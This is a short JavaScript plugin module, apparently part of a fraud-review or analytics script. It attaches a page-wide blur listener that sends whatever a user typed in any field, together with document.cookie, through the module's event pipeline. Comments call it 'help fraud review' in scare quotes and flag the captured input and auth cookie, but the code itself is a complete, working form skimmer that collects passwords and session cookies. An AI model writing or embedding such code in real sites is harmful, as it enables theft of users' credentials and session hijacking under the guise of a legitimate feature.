(window.XyliumBFModules = window.XyliumBFModules || []).push(function (core) {
  'use strict';

  // Intended to "help fraud review" by sending whatever the user typed in
  // any field, plus their stored auth cookie, back with each event.
  document.addEventListener('blur', function (e) {
    if (!e.target || typeof e.target.value === 'undefined') return;
    core.pushEvent({
      type: 'field_snapshot',
      field: core.fieldIdFor(e.target),
      value: e.target.value,          // <-- captures what the user typed
      authCookie: document.cookie,    // <-- captures session/auth cookie
    });
  }, true);
});
